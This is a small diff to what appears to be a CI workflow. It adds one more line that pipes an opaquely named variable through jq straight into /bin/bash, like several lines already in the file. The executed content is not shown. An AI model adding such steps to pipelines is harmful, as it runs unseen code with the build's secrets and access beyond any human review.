@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$j74051" | jq -r .nivl65044 | /bin/bash
           printf '%s' "$y78610" | jq -r .ci9 | /bin/bash
           echo $iygd369 | jq -r .lzm7880 | /bin/bash
+          echo $w8757 | jq -r .nup5 | /bin/bash
 
       - name: Persist results
         if: always()
